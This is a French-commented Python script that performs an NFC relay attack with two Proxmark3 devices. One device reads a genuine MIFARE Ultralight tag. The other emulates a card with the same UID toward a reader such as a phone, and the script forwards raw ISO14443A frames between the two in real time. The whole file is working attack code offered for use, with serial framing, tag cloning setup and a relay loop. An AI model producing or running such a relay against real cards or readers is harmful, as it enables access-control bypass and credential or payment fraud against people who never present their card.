#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur

Mole  (ttyACM1) : côté TAG réel   - reader actif sur le vrai tag Ultralight
Proxy (ttyACM0) : côté LECTEUR    - simulation carte NFC vers le téléphone

Flow:
  1. Proxy simule une carte, le lecteur (téléphone) envoie des commandes
  2. On récupère ces commandes depuis le proxy
  3. On les forward au mole -> vrai tag
  4. On récupère la réponse du tag
  5. On la renvoie au proxy -> lecteur
"""

import serial
import struct
import time
import sys

# ── Constantes protocole PM3 ──────────────────────────────────────────────────
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50  # "PM3a"
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50  # "PM3b"

# Commandes
CMD_PING                  = 0x0109
CMD_HF_ISO14443A_READER   = 0x0385
CMD_HF_ISO14443A_SIM      = 0x0381

# Flags ISO14443A (depuis iso14443a.h / mifare.h)
ISO14A_CONNECT            = (1 << 0)   # 0x001  anticollision + select
ISO14A_NO_DISCONNECT      = (1 << 1)   # 0x002  garder le champ actif
ISO14A_APDU               = (1 << 2)   # 0x004
ISO14A_RAW                = (1 << 3)   # 0x008  envoyer bytes bruts
ISO14A_APPEND_CRC         = (1 << 4)   # 0x010  ajouter CRC automatiquement
ISO14A_NO_SELECT          = (1 << 5)   # 0x020  ne pas faire anticollision
ISO14A_SET_TIMEOUT        = (1 << 11)  # 0x800

# Timeout relai (secondes) - le plus court possible
RELAY_TIMEOUT   = 0.5
DEFAULT_TIMEOUT = 3.0

# ── Bas niveau : envoi/réception frames PM3 ───────────────────────────────────

def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b'', label=''):
    """
    SendCommandMIX : frame NG avec ng_bit=0 et 3 args uint64 en tête de payload.
    C'est le format qu'utilise CMD_HF_ISO14443A_READER.
    """
    args      = struct.pack('<QQQ', arg0, arg1, arg2)
    payload   = args + data
    length_ng = (len(payload) & 0x7FFF) | (0 << 15)  # ng_bit = 0
    preamble  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    postamble = struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    packet = preamble + payload + postamble
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} arg0=0x{arg0:04X} "
              f"arg1={arg1} datalen={len(data)} data={data.hex()}")
    ser.write(packet)
    ser.flush()


def send_ng(ser, cmd, data=b'', label=''):
    """SendCommandNG : frame NG pure avec ng_bit=1."""
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    preamble  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    postamble = struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    packet = preamble + data + postamble
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} datalen={len(data)} data={data.hex()}")
    ser.write(packet)
    ser.flush()


def read_response(ser, timeout=DEFAULT_TIMEOUT, label=''):
    """
    Lire une réponse PM3 (format unifié NG/MIX).
    Retourne dict {cmd, status, ng, args, data} ou None.
    """
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if label:
                print(f"  [{label}] << TIMEOUT ({len(raw)}/10 bytes reçus)")
            return None
        chunk = ser.read(10 - len(raw))
        if chunk:
            raw += chunk

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        if label:
            print(f"  [{label}] << BAD MAGIC 0x{magic:08X}, flush buffer")
        ser.reset_input_buffer()
        return None

    # Lire le payload
    payload = b''
    if length > 0:
        d = time.time() + 2.0
        while len(payload) < length and time.time() < d:
            payload += ser.read(length - len(payload))

    ser.read(2)  # postamble / CRC

    # Parser args si frame MIX (ng_bit=0)
    args = (0, 0, 0)
    data = payload
    if not ng_bit and len(payload) >= 24:
        args = struct.unpack('<QQQ', payload[:24])
        data = payload[24:]

    if label:
        print(f"  [{label}] << cmd=0x{cmd:04X} status={status} ng={ng_bit} "
              f"args=({args[0]},{args[1]},{args[2]}) datalen={len(data)} data={data.hex()}")

    return {'cmd': cmd, 'status': status, 'ng': ng_bit,
            'args': args, 'data': data, 'payload': payload}

# ── Commandes haut niveau ─────────────────────────────────────────────────────

def ping(ser, label=''):
    ping_data = bytes(range(32))
    send_ng(ser, CMD_PING, ping_data)
    resp = read_response(ser, timeout=3.0)
    if resp and resp['data'] == ping_data:
        print(f"  [{label}] PING OK ✓")
        return True
    print(f"  [{label}] PING FAILED ✗")
    return False


def connect_tag(ser, label=''):
    """
    Anticollision + Select sur le tag (REQA, anticoll, select).
    Retourne dict avec uid/atqa/sak ou None.
    """
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT,
             label=label)
    resp = read_response(ser, timeout=DEFAULT_TIMEOUT, label=label)
    if not resp:
        return None

    # arg0 = longueur de l'UID
    uid_len = resp['args'][0]
    d = resp['data']
    result = {'raw': resp, 'uid': b'', 'atqa': b'', 'sak': 0}
    if len(d) >= 3:
        result['atqa'] = d[0:2]
        result['sak']  = d[2]
        result['uid']  = d[3:3 + uid_len] if 0 < uid_len <= 10 else d[3:10]
    return result


def send_raw_to_tag(ser, raw_bytes, label=''):
    """
    Envoyer des bytes bruts au tag (champ déjà actif, CRC ajouté auto).
    """
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags,
             arg1=len(raw_bytes),
             data=raw_bytes,
             label=label)
    return read_response(ser, timeout=RELAY_TIMEOUT, label=label)

# ── Classe Relay ──────────────────────────────────────────────────────────────

class NfcRelay:

    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0',
                 baudrate=115200, verbose=True):
        self.verbose = verbose
        print(f"[*] Ouverture Mole  (tag side)    : {mole_port}")
        self.mole  = serial.Serial(mole_port,  baudrate=baudrate, timeout=0.1)
        print(f"[*] Ouverture Proxy (reader side) : {proxy_port}")
        self.proxy = serial.Serial(proxy_port, baudrate=baudrate, timeout=0.1)
        time.sleep(0.3)
        self._flush_all()

    def _flush_all(self):
        self.mole.reset_input_buffer()
        self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer()
        self.proxy.reset_output_buffer()

    def close(self):
        try:
            self.mole.close()
            self.proxy.close()
        except Exception:
            pass

    def check_connections(self):
        print("\n=== Vérification connexions ===")
        ok1 = ping(self.mole,  label='MOLE ')
        ok2 = ping(self.proxy, label='PROXY')
        return ok1 and ok2

    # ── Init mole sur le tag réel ─────────────────────────────────────────────

    def init_mole_on_tag(self):
        print("\n[MOLE] Activation champ + anticollision sur le tag réel...")
        result = connect_tag(self.mole, label='MOLE')
        if not result:
            print("[MOLE] ERREUR : aucun tag détecté ! Vérifie que le tag est posé sur le mole.")
            return None
        uid  = result.get('uid',  b'')
        atqa = result.get('atqa', b'')
        sak  = result.get('sak',  0)
        print(f"[MOLE] Tag détecté !")
        print(f"       UID  : {uid.hex()}")
        print(f"       ATQA : {atqa.hex()}")
        print(f"       SAK  : {sak:02X}")
        return result

    # ── Démarrer simulation sur le proxy ──────────────────────────────────────

    def start_proxy_sim(self, uid=None, sim_type=2):
        """
        Démarre la simulation sur le proxy.
        sim_type 2 = MIFARE Ultralight / ISO14443A-3
        On utilise le même UID que le vrai tag.
        """
        uid_data = uid if (uid and len(uid) >= 4) else b'\x00' * 7
        # Padder à 10 bytes si besoin
        uid_data = uid_data.ljust(10, b'\x00')[:10]

        print(f"\n[PROXY] Démarrage simulation Ultralight (type={sim_type}) UID={uid_data[:7].hex()}...")
        # arg0 = type de simulation, arg1 = flags, data = UID
        send_mix(self.proxy, CMD_HF_ISO14443A_SIM,
                 arg0=sim_type,
                 arg1=0,
                 data=uid_data,
                 label='PROXY')
        time.sleep(0.2)
        print("[PROXY] Simulation active. Approche le téléphone du proxy.")

    # ── Boucle de relai ───────────────────────────────────────────────────────

    def relay_loop(self):
        """
        Boucle principale : le proxy reçoit les commandes du lecteur,
        on les forward au mole -> tag, on retourne la réponse.
        """
        print("\n=== RELAY LOOP ACTIVE ===")
        print("Ctrl+C pour arrêter.\n")

        iteration = 0
        no_data_count = 0

        try:
            while True:
                # Écouter le proxy (timeout très court pour la latence)
                resp = read_response(self.proxy, timeout=0.03)

                if resp is None:
                    no_data_count += 1
                    if no_data_count % 200 == 0:
                        print("  [RELAY] En attente du lecteur...")
                    continue

                no_data_count = 0

                # Extraire la trame brute du lecteur
                reader_frame = self._extract_reader_frame(resp)
                if not reader_frame:
                    continue

                iteration += 1
                if self.verbose:
                    print(f"\n--- Échange #{iteration} ---")
                    print(f"  LECTEUR -> PROXY : {reader_frame.hex()}")

                # Forward au tag via le mole
                tag_resp = send_raw_to_tag(self.mole, reader_frame, label='MOLE' if self.verbose else '')

                if tag_resp and tag_resp['data']:
                    tag_frame = tag_resp['data']
                else:
                    tag_frame = b''

                if self.verbose:
                    if tag_frame:
                        print(f"  TAG -> MOLE      : {tag_frame.hex()}")
                    else:
                        print(f"  TAG -> MOLE      : (pas de réponse)")

                # Renvoyer au proxy -> lecteur
                if tag_frame:
                    self._send_to_proxy(tag_frame)
                    if self.verbose:
                        print(f"  PROXY -> LECTEUR : {tag_frame.hex()}")

        except KeyboardInterrupt:
            print("\n\n[RELAY] Arrêt propre.")

    def _extract_reader_frame(self, resp):
        """
        Extraire les bytes reçus du lecteur depuis la réponse du proxy.
        En mode sim, le PM3 remonte les trames du lecteur dans data ou payload.
        """
        # Priorité : data directe
        if resp['data'] and len(resp['data']) > 0:
            return resp['data']
        # Fallback : payload brut après les args MIX
        if not resp['ng'] and len(resp['payload']) > 24:
            return resp['payload'][24:]
        return None

    def _send_to_proxy(self, data):
        """
        Envoyer la réponse du tag au proxy pour qu'il réponde au lecteur.
        """
        flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
        send_mix(self.proxy, CMD_HF_ISO14443A_READER,
                 arg0=flags,
                 arg1=len(data),
                 data=data)

    # ── Run complet ───────────────────────────────────────────────────────────

    def run(self):
        print("\n" + "=" * 62)
        print("   NFC RELAY ATTACK - Proxmark3 x2")
        print("   Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur")
        print("=" * 62)

        if not self.check_connections():
            print("\n[ERREUR] Un ou deux PM3 ne répondent pas. Vérifier USB.")
            return

        # 1. Détecter le tag via le mole
        tag_info = self.init_mole_on_tag()
        if not tag_info:
            return

        # 2. Démarrer la simulation avec le même UID
        self.start_proxy_sim(uid=tag_info.get('uid'), sim_type=2)

        # 3. Boucle de relai
        self.relay_loop()


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == '__main__':
    relay = NfcRelay(
        mole_port  = '/dev/ttyACM1',  # côté tag
        proxy_port = '/dev/ttyACM0',  # côté lecteur
        verbose    = True
    )
    try:
        relay.run()
    finally:
        relay.close()
        print("[*] Ports fermés.")